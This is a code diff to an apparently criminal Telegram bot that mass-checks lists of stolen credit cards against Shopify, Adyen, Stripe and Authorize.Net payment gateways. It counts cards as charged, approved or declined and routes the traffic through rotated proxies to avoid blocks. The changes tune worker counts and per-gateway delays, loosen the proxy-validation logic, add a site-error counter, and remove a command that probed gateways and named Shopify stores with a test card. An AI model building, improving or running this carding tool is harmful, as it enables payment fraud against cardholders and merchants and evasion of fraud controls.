@@ -99,11 +99,11 @@ MIN_DELAY = float(os.getenv("MIN_DELAY", "0.5"))
 MAX_DELAY = float(os.getenv("MAX_DELAY", "2.0"))
 
 WORKERS = max(1, min(50, CPM_TARGET // 10))
-API_TIMEOUT = 90
-HIT_DELAY = 1.9
+API_TIMEOUT = 45
+HIT_DELAY = 1.0
 
 _SITE_ERRORS_COUNT = {}
-_MAX_SITE_ERRORS = 8
+_MAX_SITE_ERRORS = 3
 _JOIN_CACHE = {}
 _MAINTENANCE_MODE = False
 
@@ -489,10 +489,16 @@ def parse_proxy_format(proxy):
     pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
     if 'socks' in pt:
         return None
-    if re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
-        u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
+    # Format: username:password@host:port
+    if re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy):
+        u, pw, h, p = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
+    # Format: host:port:username:password
     elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
         h, p, u, pw = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy).groups()
+    # Format: username:password@host:port (with protocol already stripped)
+    elif re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy):
+        u, pw, h, p = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy).groups()
+    # Format: host:port only (no auth)
     elif re.match(r'^([^:@]+):(\d+)$', proxy):
         h, p = re.match(r'^([^:@]+):(\d+)$', proxy).groups()
         u = pw = ''
@@ -1088,30 +1094,61 @@ async def check_proxy_real(proxy_dict, session, test_card=TEST_CARD, timeout=12)
     proxy_url = proxy_dict.get('proxy_url') if isinstance(proxy_dict, dict) else proxy_dict
     if not proxy_url:
         return False, "No proxy URL"
+
+    test_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+
+    # Test 1: Simple IP check (most reliable)
     try:
-        test_headers = {"User-Agent": "Mozilla/5.0"}
         async with session.get("https://api.ipify.org?format=json", proxy=proxy_url, timeout=timeout, ssl=False) as r:
-            if r.status != 200:
-                return False, f"IP Check Failed: {r.status}"
+            if r.status == 200:
+                data = await r.json()
+                ip = data.get('ip', 'unknown')
+                return True, f"Proxy OK (IP: {ip})"
+            # Even non-200 means proxy is working (just blocked by target)
+            if r.status in [403, 429, 503]:
+                return True, f"Proxy OK (Blocked by target: {r.status})"
+    except asyncio.TimeoutError:
+        return False, "Proxy Timeout"
+    except aiohttp.ClientProxyConnectionError as e:
+        return False, f"Proxy Connection Error"
+    except aiohttp.ClientHttpProxyError as e:
+        return False, f"Proxy Auth Error ({e.status})"
     except Exception as e:
-        return False, f"IP Check Error: {str(e)[:30]}"
-    # Test via real API gateway (Adyen preferred for speed)
+        err_str = str(e).lower()
+        if 'proxy' in err_str:
+            return False, f"Proxy Error: {str(e)[:35]}"
+        # Some other error, might still be proxy-related
+
+    # Test 2: Try a simple HTTP request to check if proxy routes traffic
+    try:
+        async with session.get("https://httpbin.org/get", proxy=proxy_url, timeout=timeout, ssl=False) as r:
+            if r.status in [200, 400, 401, 403, 404, 405, 429, 500, 502, 503]:
+                return True, f"Proxy Routes Traffic ({r.status})"
+    except Exception:
+        pass
+
+    # Test 3: Gateway test (lenient - any response means proxy works)
     try:
         card_encoded = quote(test_card)
         req_url = f"{ADYEN_API_URL}?card={card_encoded}"
         async with session.get(req_url, headers=test_headers, proxy=proxy_url, timeout=timeout, ssl=False) as r:
             text = await r.text()
-            if r.status == 200 and text.strip():
-                if "<html" not in text.lower():
-                    return True, "Gateway Test Passed"
-            if r.status in [200, 400, 401, 403, 404, 422]:
-                if text.strip() and len(text.strip()) > 5:
-                    return True, f"Gateway Reachable ({r.status})"
-        return False, f"Gateway Test Failed: {r.status}"
+            # ANY response means proxy is working - even declined/error means connection succeeded
+            if text.strip() and len(text.strip()) > 3:
+                if "<html" not in text.lower()[:100]:
+                    return True, f"Gateway Response OK ({r.status})"
+            if r.status in [200, 400, 401, 403, 404, 422, 429, 500]:
+                return True, f"Gateway Reachable ({r.status})"
     except asyncio.TimeoutError:
         return False, "Gateway Timeout"
+    except aiohttp.ClientProxyConnectionError:
+        return False, "Proxy Cannot Connect"
+    except aiohttp.ClientHttpProxyError as e:
+        return False, f"Proxy Auth Failed ({e.status})"
     except Exception as e:
-        return False, f"Gateway Error: {str(e)[:30]}"
+        return False, f"Check Failed: {str(e)[:35]}"
+
+    return False, "Proxy Unresponsive"
 
 # ====================== REAL GATE CHECKER ENGINE (Shopify Only) ======================
 async def check_gate_real(site, proxy_url, session, test_card=TEST_CARD, timeout=15):
@@ -1204,10 +1241,10 @@ async def check_card_real(card, sites, proxies, session, gateway_name, uid):
                     res = await check_stripe_api(card, p_url2, session)
                 status = res.get('status')
         if status == 'Site Error':
-            return {'status': 'Dead', 'message': res.get('message', 'Gateway Failed'), 'card': card, 'gateway': gateway_name, 'price': '-'}
+            return {'status': 'Site Error', 'message': res.get('message', 'Gateway Failed'), 'card': card, 'gateway': gateway_name, 'price': '-'}
         return res
     except Exception as e:
-        return {'status': 'Dead', 'message': f'Check Failed: {str(e)[:30]}', 'card': card, 'gateway': gateway_name, 'price': '-'}
+        return {'status': 'Site Error', 'message': f'Check Failed: {str(e)[:30]}', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
 def format_card_result(card, gateway, price="-", bin_info=None, elapsed=0.0):
     bi = bin_info or {}
@@ -1276,10 +1313,10 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         if len(cards) > cl: cards = cards[:cl]
         PENDING_FILES[uid] = cards
         kb = [
-            [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
-            [InlineKeyboardButton('Adyen (Triumph)', callback_data="gate:Adyen", style="success", icon_custom_emoji_id="5445388803223091254")],
-            [InlineKeyboardButton('Stripe ($1.00)', callback_data="gate:Stripe", style="success", icon_custom_emoji_id="5447453226498552490")],
-            [InlineKeyboardButton('AuthNet ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('Shopify (Charge) [30 Workers]', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
+            [InlineKeyboardButton('Adyen (Triumph) [Slow]', callback_data="gate:Adyen", style="success", icon_custom_emoji_id="5445388803223091254")],
+            [InlineKeyboardButton('Stripe ($1.00) [Slow]', callback_data="gate:Stripe", style="success", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('AuthNet ($20.00) [Slow]', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
             [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
@@ -1411,23 +1448,68 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"├ <b>{CE_DIAMOND} {sf('Total Proxies')}:</b> <code>{len(proxies)}</code>\n"
                 f"╰ <b>{CE_HOURGLASS} {sf('Testing each proxy via Gateway API...')}</b>",
                 use_gif=True)
+
             dead_proxies = []
             working_count = 0
-            connector = aiohttp.TCPConnector(limit=30, ssl=False)
-            async with aiohttp.ClientSession(connector=connector) as test_session:
-                async def test_single_proxy(idx, p_dict):
-                    nonlocal working_count
-                    is_working, msg = await check_proxy_real(p_dict, test_session, timeout=12)
-                    if not is_working:
-                        dead_proxies.append((idx, p_dict, msg))
-                    else:
-                        working_count += 1
-                semaphore = asyncio.Semaphore(10)
-                async def bounded_test(idx, p_dict):
+            checked_count = 0
+            total = len(proxies)
+
+            # Use a separate session with safe limits
+            connector = aiohttp.TCPConnector(limit=15, ssl=False, enable_cleanup_closed=True, force_close=True)
+            test_session = aiohttp.ClientSession(connector=connector)
+
+            try:
+                semaphore = asyncio.Semaphore(5)
+
+                async def safe_test_proxy(idx, p_dict):
+                    global working_count
+                    nonlocal checked_count
                     async with semaphore:
-                        await test_single_proxy(idx, p_dict)
-                tasks = [bounded_test(idx, p) for idx, p in enumerate(proxies)]
-                await asyncio.gather(*tasks, return_exceptions=True)
+                        try:
+                            is_working, msg = await check_proxy_real(p_dict, test_session, timeout=8)
+                            if is_working:
+                                working_count += 1
+                            else:
+                                dead_proxies.append((idx, p_dict, msg))
+                        except Exception as e:
+                            dead_proxies.append((idx, p_dict, f"Exception: {str(e)[:25]}"))
+                        checked_count += 1
+                        # Allow event loop to breathe
+                        await asyncio.sleep(0)
+
+                # Create tasks with a global timeout wrapper
+                tasks = []
+                for idx, p in enumerate(proxies):
+                    task = asyncio.create_task(safe_test_proxy(idx, p))
+                    tasks.append(task)
+
+                # Wait with a global timeout (max 3 minutes)
+                try:
+                    await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=180)
+                except asyncio.TimeoutError:
+                    logger.warning("Proxy check global timeout reached")
+                    for t in tasks:
+                        if not t.done():
+                            t.cancel()
+                    try:
+                        await asyncio.gather(*tasks, return_exceptions=True)
+                    except Exception:
+                        pass
+
+            except Exception as e:
+                logger.error(f"Proxy check session error: {e}")
+            finally:
+                # Always close session properly
+                try:
+                    await test_session.close()
+                except Exception:
+                    pass
+                try:
+                    await connector.close()
+                except Exception:
+                    pass
+
+            # Remove dead proxies
             deleted_count = 0
             for idx, p_dict, reason in sorted(dead_proxies, key=lambda x: x[0], reverse=True):
                 try:
@@ -1435,174 +1517,18 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     deleted_count += 1
                 except Exception as e:
                     logger.error(f"Failed to remove proxy at index {idx}: {e}")
+
             result_msg = f"""<b>{CE_CROWN} {sf('REAL Proxy Check Complete')} {CE_PARTY}</b>
 
-├ <b>{CE_DIAMOND} {sf('Total Checked')}:</b> <code>{sf(str(len(proxies)))}</code>
+├ <b>{CE_DIAMOND} {sf('Total Checked')}:</b> <code>{sf(str(checked_count))}/{sf(str(total))}</code>
 ├ <b>{CE_CHECK} {sf('Working')}:</b> <code>{sf(str(working_count))}</code>
 ├ <b>{CE_CLOWN} {sf('Dead Removed')}:</b> <code>{sf(str(deleted_count))}</code>
-╰ <b>{CE_SHIELD} {sf('Remaining')}:</b> <code>{sf(str(len(proxies) - deleted_count))}</code>
+╰ <b>{CE_SHIELD} {sf('Remaining')}:</b> <code>{sf(str(total - deleted_count))}</code>
 
 <i>{sf('Dead proxies have been permanently removed.')}</i>
 <i>{sf('You cannot use /chkpxy again for 1 hour.')}</i>"""
             await styled_edit(tm, result_msg)
 
-
-        # ====================== REAL /checkgates COMMAND ======================
-        elif cmd == "checkgates":
-            if uid not in ADMIN_ID:
-                return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
-            now = time.time()
-            if uid in _CHECKED_USERS_GATES:
-                last_time = _CHECK_GATES_TIME.get(uid, 0)
-                remaining = _CHECK_GATES_COOLDOWN - (now - last_time)
-                if remaining > 0:
-                    mins = int(remaining // 60)
-                    secs = int(remaining % 60)
-                    return await styled_reply(update,
-                        f"<b>{CE_BOOM} {sf('Command Already Used!')}</b>\n\n"
-                        f"├ {sf('You have already used /checkgates recently.')}\n"
-                        f"╰ {sf('Please wait')} <code>{mins}m {secs}s</code> {sf('before using it again.')}",
-                        use_gif=True)
-            _CHECKED_USERS_GATES.add(uid)
-            _CHECK_GATES_TIME[uid] = now
-            tm = await styled_reply(update,
-                f"<b>{CE_GEAR} {sf('Starting REAL Gates Check...')}</b>\n"
-                f"╰ <b>{CE_HOURGLASS} {sf('Testing all API gateways with real cards...')}</b>",
-                use_gif=True)
-
-            connector = aiohttp.TCPConnector(limit=20, ssl=False)
-            test_card = TEST_CARD
-            admin_proxies = await get_all_user_proxies(uid)
-            proxy_url = admin_proxies[0]['proxy_url'] if admin_proxies else None
-
-            working_gates = []
-            dead_gates = []
-
-            async with aiohttp.ClientSession(connector=connector) as test_session:
-                headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
-
-                # Test Adyen API
-                try:
-                    req_url = f"{ADYEN_API_URL}?card={quote(test_card)}"
-                    async with test_session.get(req_url, headers=headers, proxy=proxy_url, timeout=15, ssl=False) as r:
-                        text = await r.text()
-                        if r.status == 200 and text.strip() and "<html" not in text.lower():
-                            working_gates.append(("Adyen", "Triumph Gate", "Active"))
-                        else:
-                            dead_gates.append(("Adyen", f"Status {r.status}"))
-                except Exception as e:
-                    dead_gates.append(("Adyen", str(e)[:30]))
-
-                # Test Stripe API
-                try:
-                    req_url = f"{STRIPE_API_URL}?card={quote(test_card)}"
-                    async with test_session.get(req_url, headers=headers, proxy=proxy_url, timeout=15, ssl=False) as r:
-                        text = await r.text()
-                        if r.status == 200 and text.strip() and "<html" not in text.lower():
-                            working_gates.append(("Stripe", "$1.00 Charge", "Active"))
-                        else:
-                            dead_gates.append(("Stripe", f"Status {r.status}"))
-                except Exception as e:
-                    dead_gates.append(("Stripe", str(e)[:30]))
-
-                # Test AuthNet API
-                try:
-                    req_url = f"{AUTHNET_API_URL}?cc={quote(test_card)}&amount=20&amt=20&price=20"
-                    async with test_session.get(req_url, headers=headers, proxy=proxy_url, timeout=15, ssl=False) as r:
-                        text = await r.text()
-                        if r.status == 200 and text.strip() and "<html" not in text.lower():
-                            working_gates.append(("AuthNet", "$20.00 Charge", "Active"))
-                        else:
-                            dead_gates.append(("AuthNet", f"Status {r.status}"))
-                except Exception as e:
-                    dead_gates.append(("AuthNet", str(e)[:30]))
-
-                # Test Shopify API with a working site
-                try:
-                    site = "touch-of-finland.myshopify.com"
-                    req_url = f"{SHOPIFY_API_URL_1}?site=https://{site}&cc={quote(test_card)}"
-                    if proxy_url:
-                        req_url += f"&proxy={quote(proxy_url)}"
-                    async with test_session.get(req_url, headers=headers, proxy=proxy_url, timeout=15, ssl=False) as r:
-                        text = await r.text()
-                        if r.status == 200 and text.strip() and "<html" not in text.lower():
-                            working_gates.append(("Shopify", "Charge Gate", "Active"))
-                        else:
-                            dead_gates.append(("Shopify", f"Status {r.status}"))
-                except Exception as e:
-                    dead_gates.append(("Shopify", str(e)[:30]))
-
-                # Now check Shopify sites.txt
-                raw_sites = []
-                if update.message.reply_to_message and update.message.reply_to_message.document:
-                    f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
-                    fp = f"temp_gates_{uid}.txt"
-                    await f.download_to_drive(fp)
-                    async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file:
-                        content = await file.read()
-                    os.remove(fp)
-                    raw_sites = list(dict.fromkeys([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.splitlines() if l.strip()]))
-                else:
-                    raw_sites = await get_shopify_sites()
-
-                valid_sites = []
-                for site in raw_sites:
-                    site = site.lower().strip()
-                    if not site or "." not in site: continue
-                    site = site.split('/')[0].split('?')[0]
-                    if len(site) > 4:
-                        valid_sites.append(site)
-                valid_sites = list(dict.fromkeys(valid_sites))
-
-                if valid_sites:
-                    await styled_edit(tm,
-                        f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(valid_sites)}</code> {sf('Shopify sites...')}</b>")
-
-                    working_sites = []
-                    dead_sites = []
-                    cf_sites = []
-                    semaphore = asyncio.Semaphore(5)
-
-                    async def test_single_gate(site):
-                        async with semaphore:
-                            is_working, status, preview = await check_gate_real(site, proxy_url, test_session, timeout=15)
-                            if is_working:
-                                working_sites.append(site)
-                            elif "cloudflare" in preview.lower() or status in [403, 429, 430]:
-                                cf_sites.append(site)
-                            else:
-                                dead_sites.append((site, preview))
-
-                    tasks = [test_single_gate(site) for site in valid_sites]
-                    await asyncio.gather(*tasks, return_exceptions=True)
-
-                    # Save working sites back to sites.txt
-                    if working_sites:
-                        async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f2:
-                            await f2.write('\n'.join(working_sites))
-                        global _CACHED_SHOPIFY_SITES
-                        _CACHED_SHOPIFY_SITES = working_sites
-                        _LAST_SITES_FETCH = time.time()
-
-                    sites_result = f"\n├ <b>{CE_CHECK} {sf('Working Sites')}:</b> <code>{sf(str(len(working_sites)))}</code>\n├ <b>{CE_SHIELD} {sf('Cloudflare')}:</b> <code>{sf(str(len(cf_sites)))}</code>\n├ <b>{CE_CLOWN} {sf('Dead Removed')}:</b> <code>{sf(str(len(dead_sites)))}</code>"
-                else:
-                    sites_result = "\n├ <b>{CE_SHIELD} {sf('Sites Check')}:</b> <code>{sf('No sites to test')}</code>"
-
-            # Build result message
-            gates_result = ""
-            for name, desc, status in working_gates:
-                gates_result += f"\n├ <b>{CE_CHECK} {sf(name)} ({sf(desc)}):</b> <code>{sf(status)}</code>"
-            for name, reason in dead_gates:
-                gates_result += f"\n├ <b>{CE_CLOWN} {sf(name)}:</b> <code>{sf(reason)}</code>"
-
-            res_msg = f"""<b>{CE_CROWN} {sf('REAL Gates Check Complete')} {CE_PARTY}</b>
-
-<b>{CE_GEAR} {sf('API Gateways Status')}:</b>{gates_result}
-<b>{CE_TOP} {sf('Shopify Sites')}:</b>{sites_result}
-
-<i>{sf('Dead sites removed from sites.txt')}</i>
-<i>{sf('You cannot use /checkgates again for 30 minutes.')}</i>"""
-            await styled_edit(tm, res_msg)
 
         elif cmd == "rmpxy":
             if not await force_join_check(update, context): return
@@ -1847,7 +1773,7 @@ async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYP
 async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
     uid = update.effective_user.id
     tot = len(cards)
-    chk = chg = app = ins = dec = err = 0
+    chk = chg = app = ins = dec = err = site_err = 0
     st = time.time()
     sites = await get_shopify_sites() if gate_name == "Shopify" else []
     proxies = await get_all_user_proxies(uid)
@@ -1856,7 +1782,17 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     last_resp = sf("Waiting for response...")
     def is_stopped():
         return process_store.get(uid, {}).get("stopped", False)
-    current_workers = 1 if gate_name == "AuthNet" else WORKERS
+    # Gate-specific worker configuration
+    if gate_name == "Shopify":
+        current_workers = 30
+    elif gate_name == "AuthNet":
+        current_workers = 1
+    elif gate_name == "Adyen":
+        current_workers = 1
+    elif gate_name == "Stripe":
+        current_workers = 1
+    else:
+        current_workers = 1
     cpm_ctrl = CPMController(CPM_TARGET)
     hit_tasks = []
 
@@ -1881,7 +1817,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 [InlineKeyboardButton(f'{chk}/{tot} ({percent}%)', callback_data="none", style="success" if percent == 100 else "primary", icon_custom_emoji_id="5445163772706582819")],
                 [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
                 [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
-                [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
+                [InlineKeyboardButton(f'Site Errors: {site_err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768"), InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
                 [InlineKeyboardButton(f'Speed: {cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")],
                 [InlineKeyboardButton('Stop Process', callback_data=f"{stop_prefix}:{uid}", style="danger", icon_custom_emoji_id="5386367538735104399")]
             ]
@@ -1910,6 +1846,15 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     break
                 try:
                     await cpm_ctrl.wait()
+                    # Gate-specific extra delays to avoid errors/timeouts
+                    if gate_name == "Adyen":
+                        await asyncio.sleep(3.0)  # Slow Adyen check
+                    elif gate_name == "Stripe":
+                        await asyncio.sleep(2.5)  # Slow Stripe check
+                    elif gate_name == "Shopify":
+                        await asyncio.sleep(1.5)  # Slow Shopify check
+                    elif gate_name == "AuthNet":
+                        await asyncio.sleep(2.0)  # Slow AuthNet check
                     if is_stopped():
                         queue.task_done()
                         break
@@ -1933,12 +1878,14 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                         ins += 1
                     elif status == 'Dead':
                         dec += 1
+                    elif status == 'Site Error':
+                        site_err += 1
                     else:
                         dec += 1
                 except asyncio.CancelledError:
                     break
                 except Exception as e:
-                    err += 1
+                    site_err += 1
                     chk += 1
                     last_resp = sf(f"Sys Err: {str(e)[:20]}")
                 queue.task_done()
@@ -1964,7 +1911,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
         [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
         [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
         [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
-        [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
+        [InlineKeyboardButton(f'Site Errors: {site_err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768"), InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
         [InlineKeyboardButton(f'Average Speed: {avg_cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")]
     ]
     try:
